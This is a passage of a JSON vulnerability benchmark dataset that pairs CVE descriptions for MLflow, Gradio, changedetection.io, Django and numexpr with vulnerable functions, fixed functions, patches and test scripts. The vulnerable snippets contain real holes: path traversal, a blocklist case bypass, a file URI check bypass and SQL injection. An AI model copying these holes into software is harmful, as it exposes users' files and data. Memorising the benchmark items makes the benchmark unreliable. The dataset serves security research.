        "snippet": "    def load(self, dst_path=None) -> str:\n        \"\"\"\n        Downloads the dataset source to the local filesystem.\n\n        :param dst_path: Path of the local filesystem destination directory to which to download the\n                         dataset source. If the directory does not exist, it is created. If\n                         unspecified, the dataset source is downloaded to a new uniquely-named\n                         directory on the local filesystem.\n        :return: The path to the downloaded dataset source on the local filesystem.\n        \"\"\"\n        resp = cloud_storage_http_request(\n            method=\"GET\",\n            url=self.url,\n            stream=True,\n        )\n        augmented_raise_for_status(resp)\n\n        path = urlparse(self.url).path\n        content_disposition = resp.headers.get(\"Content-Disposition\")\n        if content_disposition is not None and (\n            file_name := next(re.finditer(r\"filename=(.+)\", content_disposition), None)\n        ):\n            # NB: If the filename is quoted, unquote it\n            basename = file_name[1].strip(\"'\\\"\")\n        elif path is not None and len(posixpath.basename(path)) > 0:\n            basename = posixpath.basename(path)\n        else:\n            basename = \"dataset_source\"\n\n        if dst_path is None:\n            dst_path = create_tmp_dir()\n\n        dst_path = os.path.join(dst_path, basename)\n        with open(dst_path, \"wb\") as f:\n            chunk_size = 1024 * 1024  # 1 MB\n            for chunk in resp.iter_content(chunk_size=chunk_size):\n                f.write(chunk)\n\n        return dst_path"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_393_1",
        "commit": "400c226953b4568f4361bc0a0c223511652c2b9d",
        "file_path": "mlflow/data/http_dataset_source.py",
        "start_line": 44,
        "end_line": 87,
        "snippet": "    def load(self, dst_path=None) -> str:\n        \"\"\"\n        Downloads the dataset source to the local filesystem.\n\n        :param dst_path: Path of the local filesystem destination directory to which to download the\n                         dataset source. If the directory does not exist, it is created. If\n                         unspecified, the dataset source is downloaded to a new uniquely-named\n                         directory on the local filesystem.\n        :return: The path to the downloaded dataset source on the local filesystem.\n        \"\"\"\n        resp = cloud_storage_http_request(\n            method=\"GET\",\n            url=self.url,\n            stream=True,\n        )\n        augmented_raise_for_status(resp)\n\n        path = urlparse(self.url).path\n        content_disposition = resp.headers.get(\"Content-Disposition\")\n        if content_disposition is not None and (\n            file_name := next(re.finditer(r\"filename=(.+)\", content_disposition), None)\n        ):\n            # NB: If the filename is quoted, unquote it\n            basename = file_name[1].strip(\"'\\\"\")\n            if _is_path(basename):\n                raise MlflowException.invalid_parameter_value(\n                    f\"Invalid filename in Content-Disposition header: {basename}. \"\n                    \"It must be a file name, not a path.\"\n                )\n        elif path is not None and len(posixpath.basename(path)) > 0:\n            basename = posixpath.basename(path)\n        else:\n            basename = \"dataset_source\"\n\n        if dst_path is None:\n            dst_path = create_tmp_dir()\n\n        dst_path = os.path.join(dst_path, basename)\n        with open(dst_path, \"wb\") as f:\n            chunk_size = 1024 * 1024  # 1 MB\n            for chunk in resp.iter_content(chunk_size=chunk_size):\n                f.write(chunk)\n\n        return dst_path"
      },
      {
        "id": "fix_py_393_2",
        "commit": "400c226953b4568f4361bc0a0c223511652c2b9d",
        "file_path": "mlflow/data/http_dataset_source.py",
        "start_line": 14,
        "end_line": 19,
        "snippet": "def _is_path(filename: str) -> bool:\n    \"\"\"\n    Return True if `filename` is a path, False otherwise. For example,\n    \"foo/bar\" is a path, but \"bar\" is not.\n    \"\"\"\n    return os.path.basename(filename) != filename"
      }
    ],
    "vul_patch": "--- a/mlflow/data/http_dataset_source.py\n+++ b/mlflow/data/http_dataset_source.py\n@@ -22,6 +22,11 @@\n         ):\n             # NB: If the filename is quoted, unquote it\n             basename = file_name[1].strip(\"'\\\"\")\n+            if _is_path(basename):\n+                raise MlflowException.invalid_parameter_value(\n+                    f\"Invalid filename in Content-Disposition header: {basename}. \"\n+                    \"It must be a file name, not a path.\"\n+                )\n         elif path is not None and len(posixpath.basename(path)) > 0:\n             basename = posixpath.basename(path)\n         else:\n\n--- /dev/null\n+++ b/mlflow/data/http_dataset_source.py\n@@ -0,0 +1,6 @@\n+def _is_path(filename: str) -> bool:\n+    \"\"\"\n+    Return True if `filename` is a path, False otherwise. For example,\n+    \"foo/bar\" is a path, but \"bar\" is not.\n+    \"\"\"\n+    return os.path.basename(filename) != filename\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2025-23042",
    "cve_description": "Gradio is an open-source Python package that allows quick building of demos and web application for machine learning models, API, or any arbitrary Python function. Gradio's Access Control List (ACL) for file paths can be bypassed by altering the letter case of a blocked file or directory path. This vulnerability arises due to the lack of case normalization in the file path validation logic. On case-insensitive file systems, such as those used by Windows and macOS, this flaw enables attackers to circumvent security restrictions and access sensitive files that should be protected. This issue can lead to unauthorized data access, exposing sensitive information and undermining the integrity of Gradio's security model. Given Gradio's popularity for building web applications, particularly in machine learning and AI, this vulnerability may pose a substantial threat if exploited in production environments. This issue has been addressed in release version 5.6.0. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/gradio-app/gradio",
    "patch_url": [
      "https://github.com/gradio-app/gradio/commit/6b63fdec441b5c9bf910f910a2505d8defbb6bf8"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_24_1",
        "commit": "345851d",
        "file_path": "gradio/utils.py",
        "start_line": 1507,
        "end_line": 1524,
        "snippet": "def is_allowed_file(\n    path: Path,\n    blocked_paths: Sequence[str | Path],\n    allowed_paths: Sequence[str | Path],\n    created_paths: Sequence[str | Path],\n) -> tuple[\n    bool, Literal[\"in_blocklist\", \"allowed\", \"created\", \"not_created_or_allowed\"]\n]:\n    in_blocklist = any(\n        is_in_or_equal(path, blocked_path) for blocked_path in blocked_paths\n    )\n    if in_blocklist:\n        return False, \"in_blocklist\"\n    if any(is_in_or_equal(path, allowed_path) for allowed_path in allowed_paths):\n        return True, \"allowed\"\n    if any(is_in_or_equal(path, created_path) for created_path in created_paths):\n        return True, \"created\"\n    return False, \"not_created_or_allowed\""
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_24_1",
        "commit": "6b63fde",
        "file_path": "gradio/utils.py",
        "start_line": 1507,
        "end_line": 1520,
        "snippet": "def is_allowed_file(\n    path: Path,\n    blocked_paths: Sequence[str | Path],\n    allowed_paths: Sequence[str | Path],\n    created_paths: Sequence[str | Path],\n) -> tuple[\n    bool, Literal[\"in_blocklist\", \"allowed\", \"created\", \"not_created_or_allowed\"]\n]:\n    in_blocklist = any(\n        is_in_or_equal(str(path).lower(), str(blocked_path).lower())\n        for blocked_path in blocked_paths\n    )\n    if in_blocklist:\n        return False, \"in_blocklist\""
      }
    ],
    "vul_patch": "--- a/gradio/utils.py\n+++ b/gradio/utils.py\n@@ -7,12 +7,8 @@\n     bool, Literal[\"in_blocklist\", \"allowed\", \"created\", \"not_created_or_allowed\"]\n ]:\n     in_blocklist = any(\n-        is_in_or_equal(path, blocked_path) for blocked_path in blocked_paths\n+        is_in_or_equal(str(path).lower(), str(blocked_path).lower())\n+        for blocked_path in blocked_paths\n     )\n     if in_blocklist:\n         return False, \"in_blocklist\"\n-    if any(is_in_or_equal(path, allowed_path) for allowed_path in allowed_paths):\n-        return True, \"allowed\"\n-    if any(is_in_or_equal(path, created_path) for created_path in created_paths):\n-        return True, \"created\"\n-    return False, \"not_created_or_allowed\"\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2025-23042:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/gradio\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2025-23042/bin/python hand_test.py\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2025-23042:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/gradio\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2025-23042/bin/python -m pytest -v test/test_routes.py -k \"test_starts_with_protocol or test_get_root_url_headers or test_get_root_url or test_show_api_false_when_is_wasm_true or test_compare_passwords_securely\"  --disable-warnings"
  },
  {
    "cve_id": "CVE-2024-51998",
    "cve_description": "changedetection.io is a free open source web page change detection tool. The validation for the file URI scheme falls short, and results in an attacker being able to read any file on the system. This issue only affects instances with a webdriver enabled, and `ALLOW_FILE_URI` false or not defined. The check used for URL protocol, `is_safe_url`, allows `file:` as a URL scheme. It later checks if local files are permitted, but one of the preconditions for the check is that the URL starts with `file://`. The issue comes with the fact that the file URI scheme is not required to have double slashes. This issue has been addressed in version 0.47.06 and all users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/dgtlmoon/changedetection.io",
    "patch_url": [
      "https://github.com/dgtlmoon/changedetection.io/commit/49bc982c697169c98b79698889fb9d26f6b3317f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_271_1",
        "commit": "e0abf0b",
        "file_path": "changedetectionio/processors/__init__.py",
        "start_line": 30,
        "end_line": 162,
        "snippet": "    def call_browser(self, preferred_proxy_id=None):\n\n        from requests.structures import CaseInsensitiveDict\n\n        url = self.watch.link\n\n        # Protect against file:// access, check the real \"link\" without any meta \"source:\" etc prepended.\n        if re.search(r'^file://', url, re.IGNORECASE):\n            if not strtobool(os.getenv('ALLOW_FILE_URI', 'false')):\n                raise Exception(\n                    \"file:// type access is denied for security reasons.\"\n                )\n\n        # Requests, playwright, other browser via wss:// etc, fetch_extra_something\n        prefer_fetch_backend = self.watch.get('fetch_backend', 'system')\n\n        # Proxy ID \"key\"\n        preferred_proxy_id = preferred_proxy_id if preferred_proxy_id else self.datastore.get_preferred_proxy_for_watch(uuid=self.watch.get('uuid'))\n\n        # Pluggable content self.fetcher\n        if not prefer_fetch_backend or prefer_fetch_backend == 'system':\n            prefer_fetch_backend = self.datastore.data['settings']['application'].get('fetch_backend')\n\n        # In the case that the preferred fetcher was a browser config with custom connection URL..\n        # @todo - on save watch, if its extra_browser_ then it should be obvious it will use playwright (like if its requests now..)\n        custom_browser_connection_url = None\n        if prefer_fetch_backend.startswith('extra_browser_'):\n            (t, key) = prefer_fetch_backend.split('extra_browser_')\n            connection = list(\n                filter(lambda s: (s['browser_name'] == key), self.datastore.data['settings']['requests'].get('extra_browsers', [])))\n            if connection:\n                prefer_fetch_backend = 'html_webdriver'\n                custom_browser_connection_url = connection[0].get('browser_connection_url')\n\n        # PDF should be html_requests because playwright will serve it up (so far) in a embedded page\n        # @todo https://github.com/dgtlmoon/changedetection.io/issues/2019\n        # @todo needs test to or a fix\n        if self.watch.is_pdf:\n           prefer_fetch_backend = \"html_requests\"\n\n        # Grab the right kind of 'fetcher', (playwright, requests, etc)\n        from changedetectionio import content_fetchers\n        if hasattr(content_fetchers, prefer_fetch_backend):\n            # @todo TEMPORARY HACK - SWITCH BACK TO PLAYWRIGHT FOR BROWSERSTEPS\n            if prefer_fetch_backend == 'html_webdriver' and self.watch.has_browser_steps:\n                # This is never supported in selenium anyway\n                logger.warning(\"Using playwright fetcher override for possible puppeteer request in browsersteps, because puppetteer:browser steps is incomplete.\")\n                from changedetectionio.content_fetchers.playwright import fetcher as playwright_fetcher\n                fetcher_obj = playwright_fetcher\n            else:\n                fetcher_obj = getattr(content_fetchers, prefer_fetch_backend)\n        else:\n            # What it referenced doesnt exist, Just use a default\n            fetcher_obj = getattr(content_fetchers, \"html_requests\")\n\n        proxy_url = None\n        if preferred_proxy_id:\n            # Custom browser endpoints should NOT have a proxy added\n            if not prefer_fetch_backend.startswith('extra_browser_'):\n                proxy_url = self.datastore.proxy_list.get(preferred_proxy_id).get('url')\n                logger.debug(f\"Selected proxy key '{preferred_proxy_id}' as proxy URL '{proxy_url}' for {url}\")\n            else:\n                logger.debug(f\"Skipping adding proxy data when custom Browser endpoint is specified. \")\n\n        # Now call the fetcher (playwright/requests/etc) with arguments that only a fetcher would need.\n        # When browser_connection_url is None, it method should default to working out whats the best defaults (os env vars etc)\n        self.fetcher = fetcher_obj(proxy_override=proxy_url,\n                                   custom_browser_connection_url=custom_browser_connection_url\n                                   )\n\n        if self.watch.has_browser_steps:\n            self.fetcher.browser_steps = self.watch.get('browser_steps', [])\n            self.fetcher.browser_steps_screenshot_path = os.path.join(self.datastore.datastore_path, self.watch.get('uuid'))\n\n        # Tweak the base config with the per-watch ones\n        from changedetectionio.safe_jinja import render as jinja_render\n        request_headers = CaseInsensitiveDict()\n\n        ua = self.datastore.data['settings']['requests'].get('default_ua')\n        if ua and ua.get(prefer_fetch_backend):\n            request_headers.update({'User-Agent': ua.get(prefer_fetch_backend)})\n\n        request_headers.update(self.watch.get('headers', {}))\n        request_headers.update(self.datastore.get_all_base_headers())\n        request_headers.update(self.datastore.get_all_headers_in_textfile_for_watch(uuid=self.watch.get('uuid')))\n\n        # https://github.com/psf/requests/issues/4525\n        # Requests doesnt yet support brotli encoding, so don't put 'br' here, be totally sure that the user cannot\n        # do this by accident.\n        if 'Accept-Encoding' in request_headers and \"br\" in request_headers['Accept-Encoding']:\n            request_headers['Accept-Encoding'] = request_headers['Accept-Encoding'].replace(', br', '')\n\n        for header_name in request_headers:\n            request_headers.update({header_name: jinja_render(template_str=request_headers.get(header_name))})\n\n        timeout = self.datastore.data['settings']['requests'].get('timeout')\n\n        request_body = self.watch.get('body')\n        if request_body:\n            request_body = jinja_render(template_str=self.watch.get('body'))\n        \n        request_method = self.watch.get('method')\n        ignore_status_codes = self.watch.get('ignore_status_codes', False)\n\n        # Configurable per-watch or global extra delay before extracting text (for webDriver types)\n        system_webdriver_delay = self.datastore.data['settings']['application'].get('webdriver_delay', None)\n        if self.watch.get('webdriver_delay'):\n            self.fetcher.render_extract_delay = self.watch.get('webdriver_delay')\n        elif system_webdriver_delay is not None:\n            self.fetcher.render_extract_delay = system_webdriver_delay\n\n        if self.watch.get('webdriver_js_execute_code') is not None and self.watch.get('webdriver_js_execute_code').strip():\n            self.fetcher.webdriver_js_execute_code = self.watch.get('webdriver_js_execute_code')\n\n        # Requests for PDF's, images etc should be passwd the is_binary flag\n        is_binary = self.watch.is_pdf\n\n        # And here we go! call the right browser with browser-specific settings\n        empty_pages_are_a_change = self.datastore.data['settings']['application'].get('empty_pages_are_a_change', False)\n\n        self.fetcher.run(url=url,\n                         timeout=timeout,\n                         request_headers=request_headers,\n                         request_body=request_body,\n                         request_method=request_method,\n                         ignore_status_codes=ignore_status_codes,\n                         current_include_filters=self.watch.get('include_filters'),\n                         is_binary=is_binary,\n                         empty_pages_are_a_change=empty_pages_are_a_change\n                         )\n\n        #@todo .quit here could go on close object, so we can run JS if change-detected\n        self.fetcher.quit()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_271_1",
        "commit": "49bc982c697169c98b79698889fb9d26f6b3317f",
        "file_path": "changedetectionio/processors/__init__.py",
        "start_line": 30,
        "end_line": 162,
        "snippet": "    def call_browser(self, preferred_proxy_id=None):\n\n        from requests.structures import CaseInsensitiveDict\n\n        url = self.watch.link\n\n        # Protect against file://, file:/ access, check the real \"link\" without any meta \"source:\" etc prepended.\n        if re.search(r'^file:/', url.strip(), re.IGNORECASE):\n            if not strtobool(os.getenv('ALLOW_FILE_URI', 'false')):\n                raise Exception(\n                    \"file:// type access is denied for security reasons.\"\n                )\n\n        # Requests, playwright, other browser via wss:// etc, fetch_extra_something\n        prefer_fetch_backend = self.watch.get('fetch_backend', 'system')\n\n        # Proxy ID \"key\"\n        preferred_proxy_id = preferred_proxy_id if preferred_proxy_id else self.datastore.get_preferred_proxy_for_watch(uuid=self.watch.get('uuid'))\n\n        # Pluggable content self.fetcher\n        if not prefer_fetch_backend or prefer_fetch_backend == 'system':\n            prefer_fetch_backend = self.datastore.data['settings']['application'].get('fetch_backend')\n\n        # In the case that the preferred fetcher was a browser config with custom connection URL..\n        # @todo - on save watch, if its extra_browser_ then it should be obvious it will use playwright (like if its requests now..)\n        custom_browser_connection_url = None\n        if prefer_fetch_backend.startswith('extra_browser_'):\n            (t, key) = prefer_fetch_backend.split('extra_browser_')\n            connection = list(\n                filter(lambda s: (s['browser_name'] == key), self.datastore.data['settings']['requests'].get('extra_browsers', [])))\n            if connection:\n                prefer_fetch_backend = 'html_webdriver'\n                custom_browser_connection_url = connection[0].get('browser_connection_url')\n\n        # PDF should be html_requests because playwright will serve it up (so far) in a embedded page\n        # @todo https://github.com/dgtlmoon/changedetection.io/issues/2019\n        # @todo needs test to or a fix\n        if self.watch.is_pdf:\n           prefer_fetch_backend = \"html_requests\"\n\n        # Grab the right kind of 'fetcher', (playwright, requests, etc)\n        from changedetectionio import content_fetchers\n        if hasattr(content_fetchers, prefer_fetch_backend):\n            # @todo TEMPORARY HACK - SWITCH BACK TO PLAYWRIGHT FOR BROWSERSTEPS\n            if prefer_fetch_backend == 'html_webdriver' and self.watch.has_browser_steps:\n                # This is never supported in selenium anyway\n                logger.warning(\"Using playwright fetcher override for possible puppeteer request in browsersteps, because puppetteer:browser steps is incomplete.\")\n                from changedetectionio.content_fetchers.playwright import fetcher as playwright_fetcher\n                fetcher_obj = playwright_fetcher\n            else:\n                fetcher_obj = getattr(content_fetchers, prefer_fetch_backend)\n        else:\n            # What it referenced doesnt exist, Just use a default\n            fetcher_obj = getattr(content_fetchers, \"html_requests\")\n\n        proxy_url = None\n        if preferred_proxy_id:\n            # Custom browser endpoints should NOT have a proxy added\n            if not prefer_fetch_backend.startswith('extra_browser_'):\n                proxy_url = self.datastore.proxy_list.get(preferred_proxy_id).get('url')\n                logger.debug(f\"Selected proxy key '{preferred_proxy_id}' as proxy URL '{proxy_url}' for {url}\")\n            else:\n                logger.debug(f\"Skipping adding proxy data when custom Browser endpoint is specified. \")\n\n        # Now call the fetcher (playwright/requests/etc) with arguments that only a fetcher would need.\n        # When browser_connection_url is None, it method should default to working out whats the best defaults (os env vars etc)\n        self.fetcher = fetcher_obj(proxy_override=proxy_url,\n                                   custom_browser_connection_url=custom_browser_connection_url\n                                   )\n\n        if self.watch.has_browser_steps:\n            self.fetcher.browser_steps = self.watch.get('browser_steps', [])\n            self.fetcher.browser_steps_screenshot_path = os.path.join(self.datastore.datastore_path, self.watch.get('uuid'))\n\n        # Tweak the base config with the per-watch ones\n        from changedetectionio.safe_jinja import render as jinja_render\n        request_headers = CaseInsensitiveDict()\n\n        ua = self.datastore.data['settings']['requests'].get('default_ua')\n        if ua and ua.get(prefer_fetch_backend):\n            request_headers.update({'User-Agent': ua.get(prefer_fetch_backend)})\n\n        request_headers.update(self.watch.get('headers', {}))\n        request_headers.update(self.datastore.get_all_base_headers())\n        request_headers.update(self.datastore.get_all_headers_in_textfile_for_watch(uuid=self.watch.get('uuid')))\n\n        # https://github.com/psf/requests/issues/4525\n        # Requests doesnt yet support brotli encoding, so don't put 'br' here, be totally sure that the user cannot\n        # do this by accident.\n        if 'Accept-Encoding' in request_headers and \"br\" in request_headers['Accept-Encoding']:\n            request_headers['Accept-Encoding'] = request_headers['Accept-Encoding'].replace(', br', '')\n\n        for header_name in request_headers:\n            request_headers.update({header_name: jinja_render(template_str=request_headers.get(header_name))})\n\n        timeout = self.datastore.data['settings']['requests'].get('timeout')\n\n        request_body = self.watch.get('body')\n        if request_body:\n            request_body = jinja_render(template_str=self.watch.get('body'))\n        \n        request_method = self.watch.get('method')\n        ignore_status_codes = self.watch.get('ignore_status_codes', False)\n\n        # Configurable per-watch or global extra delay before extracting text (for webDriver types)\n        system_webdriver_delay = self.datastore.data['settings']['application'].get('webdriver_delay', None)\n        if self.watch.get('webdriver_delay'):\n            self.fetcher.render_extract_delay = self.watch.get('webdriver_delay')\n        elif system_webdriver_delay is not None:\n            self.fetcher.render_extract_delay = system_webdriver_delay\n\n        if self.watch.get('webdriver_js_execute_code') is not None and self.watch.get('webdriver_js_execute_code').strip():\n            self.fetcher.webdriver_js_execute_code = self.watch.get('webdriver_js_execute_code')\n\n        # Requests for PDF's, images etc should be passwd the is_binary flag\n        is_binary = self.watch.is_pdf\n\n        # And here we go! call the right browser with browser-specific settings\n        empty_pages_are_a_change = self.datastore.data['settings']['application'].get('empty_pages_are_a_change', False)\n\n        self.fetcher.run(url=url,\n                         timeout=timeout,\n                         request_headers=request_headers,\n                         request_body=request_body,\n                         request_method=request_method,\n                         ignore_status_codes=ignore_status_codes,\n                         current_include_filters=self.watch.get('include_filters'),\n                         is_binary=is_binary,\n                         empty_pages_are_a_change=empty_pages_are_a_change\n                         )\n\n        #@todo .quit here could go on close object, so we can run JS if change-detected\n        self.fetcher.quit()"
      }
    ],
    "vul_patch": "--- a/changedetectionio/processors/__init__.py\n+++ b/changedetectionio/processors/__init__.py\n@@ -4,8 +4,8 @@\n \n         url = self.watch.link\n \n-        # Protect against file:// access, check the real \"link\" without any meta \"source:\" etc prepended.\n-        if re.search(r'^file://', url, re.IGNORECASE):\n+        # Protect against file://, file:/ access, check the real \"link\" without any meta \"source:\" etc prepended.\n+        if re.search(r'^file:/', url.strip(), re.IGNORECASE):\n             if not strtobool(os.getenv('ALLOW_FILE_URI', 'false')):\n                 raise Exception(\n                     \"file:// type access is denied for security reasons.\"\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-28346",
    "cve_description": "An issue was discovered in Django 2.2 before 2.2.28, 3.2 before 3.2.13, and 4.0 before 4.0.4. QuerySet.annotate(), aggregate(), and extra() methods are subject to SQL injection in column aliases via a crafted dictionary (with dictionary expansion) as the passed **kwargs.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/93cae5cb2f9a4ef1514cf1a41f714fef08005200",
      "https://github.com/django/django/commit/2c09e68ec911919360d5f8502cefc312f9e03c5d",
      "https://github.com/django/django/commit/2044dac5c6968441be6f534c4139bcf48c5c7e48",
      "https://github.com/django/django/commit/800828887a0509ad1162d6d407e94d8de7eafc60"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_2_1",
        "commit": "bdb92db",
        "file_path": "django/db/models/sql/query.py",
        "start_line": 1037,
        "end_line": 1045,
        "snippet": "    def add_annotation(self, annotation, alias, is_summary=False, select=True):\n        \"\"\"Add a single annotation expression to the Query.\"\"\"\n        annotation = annotation.resolve_expression(self, allow_joins=True, reuse=None,\n                                                   summarize=is_summary)\n        if select:\n            self.append_annotation_mask([alias])\n        else:\n            self.set_annotation_mask(set(self.annotation_select).difference({alias}))\n        self.annotations[alias] = annotation"
      },
      {
        "id": "vul_py_2_2",
        "commit": "bdb92db",
        "file_path": "django/db/models/sql/query.py",
        "start_line": 2075,
        "end_line": 2105,
        "snippet": "    def add_extra(self, select, select_params, where, params, tables, order_by):\n        \"\"\"\n        Add data to the various extra_* attributes for user-created additions\n        to the query.\n        \"\"\"\n        if select:\n            # We need to pair any placeholder markers in the 'select'\n            # dictionary with their parameters in 'select_params' so that\n            # subsequent updates to the select dictionary also adjust the\n            # parameters appropriately.\n            select_pairs = {}\n            if select_params:\n                param_iter = iter(select_params)\n            else:\n                param_iter = iter([])\n            for name, entry in select.items():\n                entry = str(entry)\n                entry_params = []\n                pos = entry.find(\"%s\")\n                while pos != -1:\n                    if pos == 0 or entry[pos - 1] != '%':\n                        entry_params.append(next(param_iter))\n                    pos = entry.find(\"%s\", pos + 2)\n                select_pairs[name] = (entry, entry_params)\n            self.extra.update(select_pairs)\n        if where or params:\n            self.where.add(ExtraWhere(where, params), AND)\n        if tables:\n            self.extra_tables += tuple(tables)\n        if order_by:\n            self.extra_order_by = order_by"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_2_3",
        "commit": "2044dac",
        "file_path": "django/db/models/sql/query.py",
        "start_line": 51,
        "end_line": 51,
        "snippet": "FORBIDDEN_ALIAS_PATTERN = _lazy_re_compile(r\"['`\\\"\\]\\[;\\s]|--|/\\*|\\*/\")"
      },
      {
        "id": "fix_py_2_1",
        "commit": "2044dac",
        "file_path": "django/db/models/sql/query.py",
        "start_line": 1042,
        "end_line": 1058,
        "snippet": "    def check_alias(self, alias):\n        if FORBIDDEN_ALIAS_PATTERN.search(alias):\n            raise ValueError(\n                \"Column aliases cannot contain whitespace characters, quotation marks, \"\n                \"semicolons, or SQL comments.\"\n            )\n\n    def add_annotation(self, annotation, alias, is_summary=False, select=True):\n        \"\"\"Add a single annotation expression to the Query.\"\"\"\n        self.check_alias(alias)\n        annotation = annotation.resolve_expression(self, allow_joins=True, reuse=None,\n                                                   summarize=is_summary)\n        if select:\n            self.append_annotation_mask([alias])\n        else:\n            self.set_annotation_mask(set(self.annotation_select).difference({alias}))\n        self.annotations[alias] = annotation"
      },
      {
        "id": "fix_py_2_2",
        "commit": "2044dac",
        "file_path": "django/db/models/sql/query.py",
        "start_line": 2088,
        "end_line": 2119,
        "snippet": "    def add_extra(self, select, select_params, where, params, tables, order_by):\n        \"\"\"\n        Add data to the various extra_* attributes for user-created additions\n        to the query.\n        \"\"\"\n        if select:\n            # We need to pair any placeholder markers in the 'select'\n            # dictionary with their parameters in 'select_params' so that\n            # subsequent updates to the select dictionary also adjust the\n            # parameters appropriately.\n            select_pairs = {}\n            if select_params:\n                param_iter = iter(select_params)\n            else:\n                param_iter = iter([])\n            for name, entry in select.items():\n                self.check_alias(name)\n                entry = str(entry)\n                entry_params = []\n                pos = entry.find(\"%s\")\n                while pos != -1:\n                    if pos == 0 or entry[pos - 1] != '%':\n                        entry_params.append(next(param_iter))\n                    pos = entry.find(\"%s\", pos + 2)\n                select_pairs[name] = (entry, entry_params)\n            self.extra.update(select_pairs)\n        if where or params:\n            self.where.add(ExtraWhere(where, params), AND)\n        if tables:\n            self.extra_tables += tuple(tables)\n        if order_by:\n            self.extra_order_by = order_by"
      }
    ],
    "vul_patch": "--- a/django/db/models/sql/query.py\n+++ b/django/db/models/sql/query.py\n@@ -1,5 +1,13 @@\n+    def check_alias(self, alias):\n+        if FORBIDDEN_ALIAS_PATTERN.search(alias):\n+            raise ValueError(\n+                \"Column aliases cannot contain whitespace characters, quotation marks, \"\n+                \"semicolons, or SQL comments.\"\n+            )\n+\n     def add_annotation(self, annotation, alias, is_summary=False, select=True):\n         \"\"\"Add a single annotation expression to the Query.\"\"\"\n+        self.check_alias(alias)\n         annotation = annotation.resolve_expression(self, allow_joins=True, reuse=None,\n                                                    summarize=is_summary)\n         if select:\n\n--- a/django/db/models/sql/query.py\n+++ b/django/db/models/sql/query.py\n@@ -14,6 +14,7 @@\n             else:\n                 param_iter = iter([])\n             for name, entry in select.items():\n+                self.check_alias(name)\n                 entry = str(entry)\n                 entry_params = []\n                 pos = entry.find(\"%s\")\n\n--- /dev/null\n+++ b/django/db/models/sql/query.py\n@@ -0,0 +1 @@\n+FORBIDDEN_ALIAS_PATTERN = _lazy_re_compile(r\"['`\\\"\\]\\[;\\s]|--|/\\*|\\*/\")\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-28346:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2022-28346/bin/python ./runtests.py queries.tests.Queries5Tests.test_extra_select_alias_sql_injection\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-28346:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2022-28346/bin/python ./runtests.py queries.tests\n"
  },
  {
    "cve_id": "CVE-2023-39631",
    "cve_description": "An issue in LanChain-ai Langchain v.0.0.245 allows a remote attacker to execute arbitrary code via the evaluate function in the numexpr library.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/pydata/numexpr",
    "patch_url": [
      "https://github.com/pydata/numexpr/commit/4b2d89cf14e75030d27629925b9998e1e91d23c7"
    ],
    "programming_language": "Python",
    "vul_func": [
